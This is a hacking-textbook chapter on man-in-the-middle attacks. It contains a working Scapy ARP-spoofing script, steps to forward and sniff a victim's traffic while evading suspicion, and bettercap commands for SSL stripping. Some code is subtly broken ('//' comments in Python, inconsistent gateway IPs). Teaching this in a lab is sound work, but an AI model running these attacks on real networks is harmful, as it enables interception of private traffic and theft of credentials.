@@ -1,0 +1,329 @@
+<html><head></head><body>
+		<div id="_idContainer097">
+			<h1 id="_idParaDest-111"><em class="italic"><a id="_idTextAnchor116"/>Chapter 5</em>: Man in the Middle Attacks</h1>
+			<p>In the previous chapter, we learned about network scanning. Network scanning is a part of information gathering that allows users to find hosts in a local network. In this chapter, we will learn how to utilize this information to attacks victims on the local network. We will cover the following topics in this chapter:</p>
+			<ul>
+				<li>Why do we need ARP?</li>
+				<li>Building an ARP spoof program</li>
+				<li>Monitoring traffic</li>
+				<li>Encrypted traffic</li>
+				<li>Restoring ARP tables manually</li>
+				<li>Decrypting the network traffic</li>
+			</ul>
+			<h1 id="_idParaDest-112"><a id="_idTextAnchor117"/>Why do we need ARP?</h1>
+			<p>In the previous<a id="_idIndexMarker281"/> chapters, we mentioned what an address resolution protocol is. In this chapter, we will look at it in more depth. In the local network, communication takes place between devices using MAC addresses instead of IP addresses. These are also called <em class="italic">link layer addresses</em>. ARP is a request response protocol, which means that one device requests a service and the other one replies in response to that request. Suppose that two devices are present in a network with no external internet connectivity. For them to communicate with each other, they need to rely on a underlying protocol, which is known as the layer 2 protocol. We've already briefly learned about ARP tables. By using an ARP table, a device can maintain a list of all active devices on the network by using a mapping of their IP and MAC addresses. This ARP table technique is quite old and was designed without security considerations in mind. It has some inherent weaknesses that can be exploited, as<a id="_idIndexMarker282"/> we will see in later sections. </p>
+			<h2 id="_idParaDest-113"><a id="_idTextAnchor118"/>ARP poisoning</h2>
+			<p>Before we<a id="_idIndexMarker283"/> learn about ARP poisoning, let's look at the ARP again. ARP is basically a program that's installed on your PC that performs all tasks related to ARP automatically, without needing any input from the user. To get an address from a machine, it puts <strong class="source-inline">FF:FF:FF:FF:FF:FF</strong> as a broadcast address in its request. It does this to send the request to all the active devices in the network while asking the relevant question. Subsequently, the intended device replies with the appropriate answer. Let's take a look at the following diagram to see how ARP requests and responses are generated:</p>
+			<div>
+				<div id="_idContainer076" class="IMG---Figure">
+					<img src="image/B14788_05_01.jpg" alt="Figure 5.1 – ARP requests and responses&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.<a id="_idTextAnchor119"/>1 – ARP requests and responses</p>
+			<p>Device <strong class="bold">A</strong> sends a request and device <strong class="bold">B</strong> replies with an answer, along with its MAC address. Looks pretty straightforward, right? Actually, there is a design flaw in this protocol. When device <strong class="bold">B</strong> receives a request, it has no way of knowing whether the information being provided by the requesting device is correct or not. In this way, you can easily <em class="italic">spoof</em> the packets. More on this in a moment.</p>
+			<p>Let's consider a<a id="_idIndexMarker284"/> simple scenario: </p>
+			<p class="figure-caption"> </p>
+			<div>
+				<div id="_idContainer077" class="IMG---Figure">
+					<img src="image/B14788_05_02.jpg" alt="Figure 5.2 – Internet communication&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.2 – Internet communication</p>
+			<p>Let's say device <strong class="bold">A</strong> wants to communicate with an internet-based device. As we already know, it can't directly connect to the internet by itself – it must go through a gateway. The corresponding IP and MAC address of the device are shown in the following image. Device <strong class="bold">A</strong> and the gateway maintain their own ARP tables. For device <strong class="bold">A</strong> to send a request to the external server, it will look inside its own ARP table to find the MAC address of the gateway device. Once it successfully finds the device's MAC address, it will send the request to the gateway. This is represented by <strong class="bold">step 1</strong> in the preceding diagram. If there is only one device in the local network, the ARP table in device <strong class="bold">A</strong> will look something like this: </p>
+			<div>
+				<div id="_idContainer078" class="IMG---Figure">
+					<img src="image/B14788_05_03.jpg" alt="Figure 5.3 – ARP table in device A&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.3 – ARP table in device A</p>
+			<p>Now, since the gateway is a bridge between a local network and the internet, I will figure out the external IP address for the packet. Then, using its own external or public IP address, it will forward the request to the server located at <strong class="source-inline">77.88.99.11</strong>. This is <strong class="bold">step 2</strong>. The server will process the request and reply to the router in <strong class="bold">step 3</strong>. The router will receive this reply and figure out where the external packet should<a id="_idIndexMarker285"/> go to. How does it figure out where the packet should go? As you may have guessed, it will look at the destination address and destination port. Using its own ARP table, it will see where the respective device is located. The ARP table in the router will look like this:</p>
+			<div>
+				<div id="_idContainer079" class="IMG---Figure">
+					<img src="image/B14788_05_04.jpg" alt="Figure 5.4 – ARP table in the router&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.4 – ARP table in the router</p>
+			<p>In <strong class="bold">step 4</strong>, the router will simply forward the reply to the intended recipient.</p>
+			<p>So far, we've learned how a normal request response works. Now, we will add an additional player called the <em class="italic">hacker/pentester</em>. </p>
+			<p>ARP works in the following way. As we already know, devices keep connecting and disconnecting to a network all the time, so the ARP program doesn't keep this ARP table<a id="_idIndexMarker286"/> indefinitely. Another reason for this is that the <strong class="bold">dynamic host control protocol</strong> (<strong class="bold">DHCP</strong>) server automatically assigns IP addresses to devices in a network. So, when a device goes offline, the IP address becomes available again so that it can be assigned to new connected devices. For this reason, devices in a network periodically send <em class="italic">ARP responses</em> to other devices in a network to let them know of their current IP and MAC addresses. This ensures that all the devices have an updated record of the IP and MAC addresses. Now, when a device receives an <em class="italic">ARP response</em>, it just updates its ARP table without any authentication or validation. You can see the problem here, right? If a device creates an ARP response with fake information and sends it over to a victim/target machine, the receiving device will update its ARP table with fake information, without validating the correctness of the data. Another weakness in the ARP protocol is that it allows us to accept responses, even if it didn't send a request.</p>
+			<p>Let's take a look<a id="_idIndexMarker287"/> at what happens when we add a malicious actor to a network: </p>
+			<div>
+				<div id="_idContainer080" class="IMG---Figure">
+					<img src="image/B14788_05_05.jpg" alt="Figure 5.5 – Attacker added to the network&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.5 – Attacker added to the network</p>
+			<p>Here, device <strong class="bold">B</strong>, which belongs to the hacker, will generate two fake <em class="italic">ARP responses</em> – one for the victim and one for the gateway router. It will send an <strong class="source-inline">arp</strong> reply to device <strong class="bold">A</strong> and pretend to be a router. Similarly, it will send a reply to the router and pretend to be device <strong class="bold">A</strong>. Now, both device <strong class="bold">A</strong> and the router will update their ARP tables with this new <em class="italic">fake</em> information. Now, if device <strong class="bold">A</strong> makes the same request as it did in the previous case to the external server, instead of the request going to the router, the request will go to the attacker. The attacker can then choose to forward the request to the router. At this point, the router will think the request is coming from device <strong class="bold">A</strong> while in reality, the request is coming from device <strong class="bold">B</strong>. Device <strong class="bold">B</strong> is, in fact, intercepting all the network traffic between the router and device <strong class="bold">A</strong>. Remember the CIA triad, which we learned about previously? Can you figure out which rule is being violated here? All three rules can be broken here, depending on what the hacker intends to do with the information here. Now, the hacker is effectively the <em class="italic">man in the middle</em> between the router and device <strong class="bold">A</strong>. This <a id="_idIndexMarker288"/>is why it is called a <strong class="bold">man in the middle</strong> (<strong class="bold">MITM</strong>) attack. This<a id="_idIndexMarker289"/> vulnerability is very well known and is called ARP poisoning. </p>
+			<p class="callout-heading">Important Note</p>
+			<p class="callout">The ARP table gets reset after a certain period of time, so just sending one packet to spoof is not going to work properly. To be able to successfully spoof for longer periods, you need to constantly send these fake manufactured packets so that ARP tables don't get reset after a certain time. </p>
+			<h1 id="_idParaDest-114"><a id="_idTextAnchor120"/>Building an ARP spoof program </h1>
+			<p>In this<a id="_idIndexMarker290"/> section, we will learn how to build an ARP spoof program. Before we move on, let's take a look at the ARP tables again in both Kali as well as the Windows. The ARP table in Kali Linux is as follows:</p>
+			<div>
+				<div id="_idContainer081" class="IMG---Figure">
+					<img src="image/B14788_05_06.jpg" alt="Figure 5.6 – ARP table in Kali Linux&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.6 – ARP table in Kali Linux</p>
+			<p>The ARP table in Windows looks like this. Take a look at the highlighted fields:</p>
+			<div>
+				<div id="_idContainer082" class="IMG---Figure">
+					<img src="image/Image86812.jpg" alt="Figure 5.7 – ARP table in Windows 10 &#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.7 – ARP table in Windows 10 </p>
+			<p>As you can<a id="_idIndexMarker291"/> see, they have the correct MAC addresses for the router located at <strong class="source-inline">192.168.74.2</strong>. Kali is located at <strong class="source-inline">192.168.74.128</strong>, while Windows 10 is located at <strong class="source-inline">192.168.74.129</strong>.</p>
+			<p>To spoof these devices, we will take on this problem step by step. First, we will tackle spoofing the victim machine with the MAC address of the router.</p>
+			<h2 id="_idParaDest-115"><a id="_idTextAnchor121"/>Arp spoof project</h2>
+			<p>Open VS Code in <a id="_idIndexMarker292"/>Kali Linux and create a new project named ARP spoof. Install the virtual environment, as shown in <a href="B14788_02_Final_JC_ePub.xhtml#_idTextAnchor054"><em class="italic">Chapter 2</em></a>, <em class="italic">Getting Started – Setting Up A Lab Environment</em>. Once the virtual environment has been installed, enable the virtual environment by writing the following command: </p>
+			<p class="source-code">source venv/bin/activate</p>
+			<p>This will activate the new virtual environment. Install the <strong class="source-inline">Scapy</strong> module inside this environment and create a new file named <strong class="source-inline">main.py</strong>.</p>
+			<p>To import all the <strong class="source-inline">scapy</strong> modules in one line without having to explicitly import everything separately, you can write the following line: </p>
+			<p class="source-code">from scapy.all import *</p>
+			<p><strong class="source-inline">*</strong> means that we want to import all the modules present in <strong class="source-inline">scapy</strong>. As we learned in the previous section, to spoof, we have to create fake responses. First, we will create a response intended for the victim. To do this, we will create an <strong class="source-inline">arp</strong> packet and see what fields can be set in it. To create an ARP packet and to see which fields<a id="_idIndexMarker293"/> are present, we can write the following code: </p>
+			<p class="source-code">arp_response = ARP()</p>
+			<p class="source-code">print(arp_response.show())</p>
+			<p>The output of this code looks like this:</p>
+			<div>
+				<div id="_idContainer083" class="IMG---Figure">
+					<img src="image/Image86820.jpg" alt="Figure 5.8 – ARP packet fields&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.8 – ARP packet fields</p>
+			<p>The fields that we are interested in start from <strong class="source-inline">op</strong> onward. Op stands for operation or type of packet. This is a <strong class="source-inline">who has</strong> operation, which means that it is an ARP request. But we are interested in creating an ARP response instead. <strong class="source-inline">hwsrc</strong> is the MAC address of the Kali machine and similarly, <strong class="source-inline">psrc</strong> is its IP address. <strong class="source-inline">hwdst</strong> and <strong class="source-inline">pdst</strong> haven't been set for this packet yet. Now, we will make the following modifications in this packet in order to spoof the victim:</p>
+			<ul>
+				<li>Change <strong class="source-inline">op</strong> to <strong class="source-inline">2</strong>, implying that this is a response ARP packet, not a request. Note that by default, this value is 1, which means it corresponds to the <strong class="source-inline">who-has</strong> operation.</li>
+				<li>Change the <strong class="source-inline">psrc</strong> address field to make it equal to the value of the IP address of the router. Since our router is located at <strong class="source-inline">192.168.72.2</strong>, we will set this field to this value.</li>
+				<li>Lastly, we will set <strong class="source-inline">pdst</strong> to the <strong class="source-inline">ip</strong> address of the victim machine, which is <strong class="source-inline">192.168.74.129</strong>. We will also set the <strong class="source-inline">hwdst</strong> address, which is the victim's MAC address. </li>
+			</ul>
+			<p>To see the MAC address of the Windows machine, you can write the following command in the<a id="_idIndexMarker294"/> Command Prompt or use the network scanner we created in the previous chapter:</p>
+			<p class="source-code">Ipconfig /all</p>
+			<p>Once you have the necessary information, proceed to Python to make the following changes:</p>
+			<p class="source-code">arp_response.op = 2</p>
+			<p class="source-code">arp_response.pdst = "192.168.74.129" // windows IP</p>
+			<p class="source-code">arp_response.hwdst = "00:0C:29:BE:47:14"     // windows mac</p>
+			<p class="source-code">arp_response.hwsrc = "00:0c:29:90:79:02"     // kali mac</p>
+			<p class="source-code">arp_response.psrc = "192.168.74.2"   // fake field value</p>
+			<p>Only the last field is crafted; we will be sending it from <strong class="source-inline">192.168.74.128</strong> while pretending to be at <strong class="source-inline">192.168.74.2</strong>. Once all the fields have been set, you can print them to see if they have been defined correctly: </p>
+			<p class="source-code">print(arp_response.show())</p>
+			<p>The following screenshot shows the spoofed packet according to the code we wrote previously:</p>
+			<div>
+				<div id="_idContainer084" class="IMG---Figure">
+					<img src="image/B14788_05_09.jpg" alt="Figure 5.9 – Spoofed ARP packet&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.9 – Spoofed ARP packet</p>
+			<p>Here, you can<a id="_idIndexMarker295"/> see that the <strong class="source-inline">op</strong> field is now a response instead of request. The field value is now <strong class="source-inline">is-at</strong>. Similarly, the <strong class="source-inline">psrc</strong> field is pretending to be the IP of the router instead of Kali. Note that we haven't sent the packet yet. To send this packet, we can simply use the <strong class="source-inline">send</strong> function: </p>
+			<p class="source-code">send(arp_response)</p>
+			<p>Now, if you run this program and quickly go to the Windows machine before the <strong class="source-inline">arp</strong> table gets reset, you will see that the <strong class="source-inline">arp</strong> table of the Windows machine has been poisoned and that its <strong class="source-inline">arp</strong> table entry shows the wrong MAC address for the <strong class="source-inline">192.168.72.2</strong> gateway. Instead of pointing to the actual gateway, it now points to Kali's MAC address: </p>
+			<div>
+				<div id="_idContainer085" class="IMG---Figure">
+					<img src="image/B14788_05_10.jpg" alt="Figure 5.10 – Poisoned ARP table in Windows&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.10 – Poisoned ARP table in Windows</p>
+			<p>Compare this with <em class="italic">Figure 5.6</em> for the value of <strong class="source-inline">192.168.74.2</strong>. Here, you can see that the<a id="_idIndexMarker296"/> value of the physical address in this new table has been modified. Note that if you take too long to view this value, it will be reset automatically. We will learn how to stop it from being reset automatically for a longer poisoning period in a moment.</p>
+			<p>Now, let's create a function so that we can call it easily:</p>
+			<p class="source-code">def spoof_victim():</p>
+			<p class="source-code">    arp_response = ARP()</p>
+			<p class="source-code">    arp_response.op = 2</p>
+			<p class="source-code">    arp_response.pdst = "192.168.74.129"</p>
+			<p class="source-code">    arp_response.hwdst = "00:0C:29:BE:47:14"</p>
+			<p class="source-code">    arp_response.hwsrc = "00:0c:29:90:79:02"</p>
+			<p class="source-code">    arp_response.psrc = "192.168.74.2"</p>
+			<p class="source-code">    send(arp_response)</p>
+			<p>We will create a similar function to spoof the router as well: </p>
+			<p class="source-code"> def spoof_router():</p>
+			<p class="source-code">    arp_response = ARP()</p>
+			<p class="source-code">    arp_response.op = 2</p>
+			<p class="source-code">    arp_response.pdst = "192.168.74.2" // router's IP</p>
+			<p class="source-code">    arp_response.hwdst = "00:50:56:ff:74:8b" // router's mac</p>
+			<p class="source-code">    arp_response.hwsrc = "00:0c:29:90:79:02" // kali's mac</p>
+			<p class="source-code">    arp_response.psrc = "192.168.74.129" // fake pretending to be device A. </p>
+			<p class="source-code">    send(arp_response)</p>
+			<p>In this function, we have changed the values of <strong class="source-inline">pdst</strong>, <strong class="source-inline">hwdst</strong>, and <strong class="source-inline">psrc</strong>. </p>
+			<p>The complete<a id="_idIndexMarker297"/> program is as follows:</p>
+			<p class="source-code">from scapy.all import *</p>
+			<p class="source-code">def spoof_victim():</p>
+			<p class="source-code">    arp_response = ARP()</p>
+			<p class="source-code">    arp_response.op = 2</p>
+			<p class="source-code">    arp_response.pdst = "192.168.74.129"</p>
+			<p class="source-code">    arp_response.hwdst = "00:0C:29:BE:47:14"</p>
+			<p class="source-code">    arp_response.hwsrc = "00:0c:29:90:79:02"</p>
+			<p class="source-code">    arp_response.psrc = "192.168.74.2"</p>
+			<p class="source-code">    send(arp_response)</p>
+			<p class="source-code">def spoof_router():</p>
+			<p class="source-code">    arp_response = ARP()</p>
+			<p class="source-code">    arp_response.op = 2</p>
+			<p class="source-code">    arp_response.pdst = "192.168.74.2"</p>
+			<p class="source-code">    arp_response.hwdst = "00:50:56:ff:74:8b"</p>
+			<p class="source-code">    arp_response.hwsrc = "00:0c:29:90:79:02"</p>
+			<p class="source-code">    arp_response.psrc = "192.168.74.129"</p>
+			<p class="source-code">    send(arp_response)</p>
+			<p class="source-code">if __name__ == "__main__":</p>
+			<p class="source-code">    spoof_victim()</p>
+			<p class="source-code">    spoof_router()</p>
+			<p class="source-code">    </p>
+			<p>Note that this will only spoof these devices once. To create a permanent spoofing, we can add these function calls to a loop and continuously send these packets after a certain delay. This way, the <strong class="source-inline">arp</strong> tables will not get a chance to reset and you will be able to permanently spoof these devices, as long as your spoof program is running. </p>
+			<p>We can also <a id="_idIndexMarker298"/>try to put an exit condition in a loop. We will use <strong class="source-inline">KeyboardInterrupt</strong> to exit. Use the following code to send packets continuously after a delay of every 2 seconds:</p>
+			<p class="source-code">    try:</p>
+			<p class="source-code">        while True:</p>
+			<p class="source-code">            spoof_victim()</p>
+			<p class="source-code">            spoof_router()</p>
+			<p class="source-code">            time.sleep(2)</p>
+			<p class="source-code">    except KeyboardInterrupt as err:</p>
+			<p class="source-code">        print("exiting")</p>
+			<p>Note that you will need to import the time module at the top of file. Although our spoofing program looks complete, there is a slight problem – if the victim now tries to request an internet server, they will see an internet connectivity issue. Run the <strong class="source-inline">arp</strong> spoof program on Linux and go to the Windows machine and try to access a website. You will see a window similar to the following: </p>
+			<div>
+				<div id="_idContainer086" class="IMG---Figure">
+					<img src="image/B14788_05_11.jpg" alt="Figure 5.11 – No connection&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.11 – No connection</p>
+			<p>This is because <a id="_idIndexMarker299"/>the packets are going to the Kali machine but it is blocking packets from being forwarded. To enable packet forwarding, run the following command on your Linux Terminal: </p>
+			<p class="source-code">sysctl -w net.ipv4.ip_forward=1</p>
+			<p>This will enable IP forwarding on the Kali machine. Now, the Windows user will be able to access the internet without even noticing that someone is intercepting their traffic: </p>
+			<div>
+				<div id="_idContainer087" class="IMG---Figure">
+					<img src="image/B14788_05_12.jpg" alt="Figure 5.12 – Enabling IPv4 forwarding&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.12 – Enabling IPv4 forwarding</p>
+			<p>Now, if you go to the Windows machine and try to access a website again, you should have<a id="_idIndexMarker300"/> internet connectivity. Now, your spoof program should be working perfectly.</p>
+			<h1 id="_idParaDest-116"><a id="_idTextAnchor122"/>Monitoring traffic</h1>
+			<p>To see what<a id="_idIndexMarker301"/> the user is doing, you can open <em class="italic">Wireshark</em> on Kali and select the <strong class="source-inline">eth0</strong> interface to see all the traffic going over the network. To see only the traffic originating from the Windows machine, you can set a filter in the filter menu. Use the following filter:</p>
+			<p class="source-code">ip.src == 192.168.74.129</p>
+			<p>This will only display the traffic that originates from the Windows machine. Now, if you were to go to the Windows machine and access a website, you should see the packet arriving in Wireshark:</p>
+			<div>
+				<div id="_idContainer088" class="IMG---Figure">
+					<img src="image/B14788_05_13.jpg" alt="Figure 5.13 – Wireshark traffic from a Windows machine&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.13 – Wireshark traffic from a Windows machine</p>
+			<p>In this section, we learned how to poison an ARP table and monitor the network traffic between the victim device and the internet. In the next section, we will learn how this network traffic is encrypted and how this encryption can be broken.</p>
+			<h1 id="_idParaDest-117"><a id="_idTextAnchor123"/>Encrypted traffic</h1>
+			<p>In the early days<a id="_idIndexMarker302"/> of the internet, internet traffic was mostly text-based, so everyone sniffing over the network could see exactly what was being sent over it. This was extremely unsecure and people could not send sensitive information such as passwords over the network. Since then, the internet has come a long way. Now, most internet traffic, except for some really old websites, is secure and uses encryption. This means that even if you can see the traffic, you will not be able to read it since it is encrypted. If you see the <strong class="source-inline">https</strong> tag on a website's URL, this means that the network traffic is encrypted and can't be read over the wire. There are tools that can be used to decrypt this traffic. </p>
+			<h1 id="_idParaDest-118"><a id="_idTextAnchor124"/>Restoring ARP tables manually</h1>
+			<p>Now that we<a id="_idIndexMarker303"/> have seen how to successfully spoof packets, when we close our program by using a keyboard interrupt, such as <em class="italic">Ctrl</em> + <em class="italic">C</em>, we will see that the internet becomes unavailable again on our Windows machine. This is because the ARP tables have been poisoned and we haven't restored them, so they don't know where to route the network traffic. This will automatically reset itself after a couple of minutes. However, this can raise suspicion for the victim, and they might realize that someone is tampering with their network traffic. To avoid this, we can restore these tables by sending over correct information when we exit the program. We can use the following program to restore the correct values:</p>
+			<p class="source-code">def restore():</p>
+			<p class="source-code">    # restoring router table</p>
+			<p class="source-code">    arp_response = ARP()</p>
+			<p class="source-code">    arp_response.op = 2</p>
+			<p class="source-code">    arp_response.pdst = "192.168.74.2"</p>
+			<p class="source-code">    arp_response.hwdst = "00:50:56:ff:74:8b"</p>
+			<p class="source-code">    arp_response.hwsrc = "00:0C:29:BE:47:14"</p>
+			<p class="source-code">    arp_response.psrc = "192.168.74.129"</p>
+			<p class="source-code">    send(arp_response)</p>
+			<p class="source-code">    #restoring windows table</p>
+			<p class="source-code">    arp_response = ARP()</p>
+			<p class="source-code">    arp_response.op = 2</p>
+			<p class="source-code">    arp_response.pdst = "192.168.74.129"</p>
+			<p class="source-code">    arp_response.hwdst = "00:0C:29:BE:47:14"</p>
+			<p class="source-code">    arp_response.hwsrc = "00:50:56:ff:74:8b"</p>
+			<p class="source-code">    arp_response.psrc = "192.168.74.2"</p>
+			<p class="source-code">    send(arp_response)</p>
+			<p>Note <a id="_idIndexMarker304"/>that these values are for my platform; they will be different for your platform, so you should change these values accordingly. To restore the ARP table, send these values to the router from our Linux machine while pretending to be device A. This time, instead of entering fake information, enter the correct values. Do the same for the Windows machine. Finally, call this function when a keyboard interrupt occurs, as shown here:</p>
+			<p class="source-code">    try:</p>
+			<p class="source-code">        while True:</p>
+			<p class="source-code">            spoof_victim()</p>
+			<p class="source-code">            spoof_router()</p>
+			<p class="source-code">            time.sleep(2)</p>
+			<p class="source-code">    except KeyboardInterrupt as err:</p>
+			<p class="source-code">        print("restoring ARP tables")</p>
+			<p class="source-code">        restore()</p>
+			<p class="source-code">        print("exiting")</p>
+			<p>In this section, we learned how to poison an ARP table, monitor the network traffic, and restore the ARP tables in the victim machines to make sure they're not suspicious of our activity. Next, we will learn how to decrypt this network traffic. </p>
+			<h1 id="_idParaDest-119"><a id="_idTextAnchor125"/>Decrypting the network traffic</h1>
+			<p>As we saw in<a id="_idIndexMarker305"/> the previous section, we can intercept traffic using a man in the middle attack. However, this attack is rarely useful on its own since all the browser traffic nowadays is encrypted, so even if you were able to intercept traffic, you won't be able to do much. You can bypass this procedure by using SSL stripping. Intercepting traffic without encryption is also sometimes useful when you want to monitor a user's activity. This can help you figure out which websites a user is visiting the most. Using this information alongside social engineering attacks can help you compromise the victim's machine. </p>
+			<h2 id="_idParaDest-120"><a id="_idTextAnchor126"/>HTTPS versus HTTP</h2>
+			<p>To understand<a id="_idIndexMarker306"/> how SSL stripping works, we need <a id="_idIndexMarker307"/>to understand how the <strong class="bold">hypertext transfer protocol</strong> (<strong class="bold">HTTP</strong>) and HTTPS protocols work. HTTPS is a <em class="italic">secure</em> version of HTTP, as indicated by the <em class="italic">S</em> at the end of its name. It was developed in the early days of the internet, when information was sent in the form of human readable text and anyone intercepting or monitoring the traffic could potentially see what was going on. </p>
+			<p>A typical <strong class="bold">HTTP</strong> request would look something like this: </p>
+			<div>
+				<div id="_idContainer089" class="IMG---Figure">
+					<img src="image/B14788_05_14.jpg" alt="Figure 5.14 – HTTP request&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.14 – HTTP request</p>
+			<p>As you can see, the body of the HTTP request is in the form of plain text, which means it can be read easily. So, if you were to send your email or password in plain text to the server, the hacker could potentially steal your credentials. You already know how dangerous this can be. To avoid this problem, HTTPS was developed, which could encrypt the body of the message so that only the server and requestor can read it with the proper encryption keys –  no middle man can read it. Once the server receives the request, it will respond with the appropriate reply. The<a id="_idIndexMarker308"/> server's<a id="_idIndexMarker309"/> reply would look like this:</p>
+			<div>
+				<div id="_idContainer090" class="IMG---Figure">
+					<img src="image/B14788_05_15.jpg" alt="Figure 5.15 – HTTP reply&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.15 – HTTP reply</p>
+			<p>The last line represents the body of the reply, which is the web page that the user requested. In the case of HTTPS, the <em class="italic">body</em> of these requests and responses would be encrypted and appear as gibberish to the attacker. Now, let's focus on how we can bypass this.</p>
+			<h2 id="_idParaDest-121"><a id="_idTextAnchor127"/>Bypassing HTTPS</h2>
+			<p>Although <a id="_idIndexMarker310"/>the majority of websites nowadays <a id="_idIndexMarker311"/>support HTTPS instead of HTTP, on the server side, in order to maintain backward compatibility, the server still allows requests to come from <em class="italic">HTTP</em> and once they receive them, they will check whether the client/requestor supports HTTPS or not. We can take advantage of this to bypass this security mechanism. The following diagram shows how HTTP requests work with a web server: </p>
+			<div>
+				<div id="_idContainer091" class="IMG---Figure">
+					<img src="image/B14788_05_16.jpg" alt="Figure 5.16 – HTTP cycle&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.16 – HTTP cycle</p>
+			<p>When the client first accesses a website, it is usually over HTTP protocol, so it sends an unsecure request to initiate a connection. The server receives this request and asks the client whether it supports HTTPS or not. If the client supports HTTPS, the server will say, <em class="italic">Why don't you talk with me over HTTPS?</em>. The client then switches to <em class="italic">HTTPS</em>. Once this happens, all the communication is encrypted. </p>
+			<p>This is where we will introduce our middle man <em class="italic">attacker</em>. We will do so in a way to fool both the server and the client. Let's take a look at the following diagram:</p>
+			<div>
+				<div id="_idContainer092" class="IMG---Figure">
+					<img src="image/B14788_05_17.jpg" alt="Figure 5.17 – MITM attack with SSL stripping&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.17 – MITM attack with SSL stripping</p>
+			<p>During the <a id="_idIndexMarker312"/>first phase, the client will make an HTTP <a id="_idIndexMarker313"/>request to the server. The attacker is sitting between the client and the server and is using the <strong class="source-inline">arp</strong> spoofing program to monitor the traffic that we developed in the previous chapter. They will take this request from the client, convert it into an HTTPS request, and forward it to the server. The server will think that the client is talking over HTTPS instead of HTTP. Similarly, the attacker will take replies from the server, decrypt them, and read what is happening. Once they've done that, they will forward them to the victim/client. In this way, the victim will think that the server is talking over HTTP, while the server will think that the client is talking over HTTPS. Meanwhile, the attacker is reading all the network traffic. </p>
+			<p>The job of the attacker is to encrypt and decrypt the SSL certificates that are used by servers for authenticating security on the transport layer. They form the basis of secure communication. Learning how to perform SSL stripping is outside the scope of this book as it requires extensive knowledge of networking, which could be a book on its own. Our goal here is to compromise the system using this tool. We will use a famous SSL stripping <a id="_idIndexMarker314"/>tool called <strong class="bold">bettercap</strong> to do so. We will use version 2.23. Note that the latest tools for this component don't seem to<a id="_idIndexMarker315"/> work properly. It can be found at <a href="https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip">https://github.com/bettercap/bettercap/releases/download/v2.23/bettercap_linux_amd64_2.23.zip</a>.</p>
+			<p>Download this tool and run it on Linux. </p>
+			<p>Once you've <a id="_idIndexMarker316"/>downloaded it, put this zipped file in your <a id="_idIndexMarker317"/>desired location on Kali Linux and extract the module. You will see an executable named <strong class="source-inline">bettercap</strong>. You could directly run this executable and it would work just fine. However, I recommend putting this in the <strong class="source-inline">/usr/bin/</strong> directory so that you can access it from anywhere, so copy this file into <strong class="source-inline">/usr/bin/</strong>. </p>
+			<p>To copy the file, use the following command:</p>
+			<p class="source-code">sudo cp bettercap /usr/bin/bettercap</p>
+			<p>Once copied, simply open a Terminal and type <strong class="source-inline">bettercap</strong> to run the file. Before proceeding, we need to do a couple of things to start it. Write the following command: </p>
+			<p class="source-code">sudo bettercap</p>
+			<p>The interface will look like this:</p>
+			<div>
+				<div id="_idContainer093" class="IMG---Figure">
+					<img src="image/B14788_05_18.jpg" alt="Figure 5.18 – bettercap version&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.18 – bettercap version</p>
+			<p>Next, you need to update a couple of things; that is, some internal files for this module called caplets. Don't worry – you don't need to understand much about caplets here. Just write the following commands and let the magic happen: </p>
+			<p class="source-code">caplets.update</p>
+			<p>This will download some files and update them. </p>
+			<p>Exit this program<a id="_idIndexMarker318"/> to let the changes take place. Now, let's run the program again with the<a id="_idIndexMarker319"/> following command: </p>
+			<p class="source-code">sudo bettercap –-silent -iface eth0</p>
+			<p>This command will run <strong class="source-inline">bettercap</strong> in silent mode while using <strong class="source-inline">eth0</strong> as its main network interface. To see which devices are available on the network, you can type in the following command: </p>
+			<p class="source-code">net.probe on</p>
+			<p>The output of this command will look something like this: </p>
+			<div>
+				<div id="_idContainer094" class="IMG---Figure">
+					<img src="image/B14788_05_19.jpg" alt="Figure 5.19 – Live hosts on the network&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.19 – Live hosts on the network</p>
+			<p>Let's try to use the internal <strong class="source-inline">arpspoof</strong> program for this application. Type in the following command to set up <strong class="source-inline">arp</strong> spoofing for our Windows machine: </p>
+			<p class="source-code">set arp.spoof.targets 192.168.74.129</p>
+			<p>This will set up the victim. To start the <strong class="source-inline">arp</strong> spoofing program, we can write the following command:</p>
+			<p class="source-code">set arp.spoof.internal true</p>
+			<p class="source-code">set arp.spoof on</p>
+			<p>This will start spoofing the devices: </p>
+			<div>
+				<div id="_idContainer095" class="IMG---Figure">
+					<img src="image/B14788_05_20.jpg" alt="Figure 5.20 – Device spoofing&#13;&#10;"/>
+				</div>
+			</div>
+			<p class="figure-caption">Figure 5.20 – Device spoofing</p>
+			<p>At this<a id="_idIndexMarker320"/> point, we've<a id="_idIndexMarker321"/> come to the <strong class="source-inline">SSL</strong> stripping part. To start stripping the HTTPS traffic, we need to go to the Windows machine and clear all browsing history. This will ensure that we don't load the cached versions of the websites. </p>
+			<p>If you want to see what services are running on <strong class="source-inline">bettercap</strong>, you can use the following <strong class="source-inline">help</strong> command: </p>
+			<div>
+				<div id="_idContainer096" class="IMG---Figure">
+					<img src="image/B14788_05_21.jpg" alt="Figure 5.21 – Help command&#13;&#10;"/>
+				</div>
+			</div>
